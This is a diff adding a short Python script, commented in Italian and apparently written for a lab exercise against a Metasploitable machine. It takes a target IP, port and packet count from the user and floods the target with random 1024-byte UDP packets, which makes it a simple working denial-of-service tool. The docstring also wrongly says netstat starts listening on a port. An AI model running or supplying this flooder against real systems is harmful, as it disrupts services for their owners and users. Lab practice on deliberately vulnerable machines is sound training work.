@@ -1,0 +1,30 @@
+"""
+Attaccata macchina Metasploitabe
+attivando l'ascolto sulla una porta con comando: 'netstat -p -u -l [numeroporta]'
+#ALESSIO RUSSO
+
+"""
+
+
+import socket
+import random
+
+
+packets = int(input("inserisci il numero di pacchetti da inviare ;"))
+targetip = input("inserisci l'IP del target: ")
+target_port = int(input("inserisci porta target: "))
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.connect((targetip, target_port))
+
+print("server connesso:")
+
+sent = 0
+
+while sent < packets:
+	msg = random._urandom(1024)
+	sock.sendto(msg, (targetip, target_port))
+	
+	sent += 1
+	
+print(f" {sent} pacchetti inviati.") 
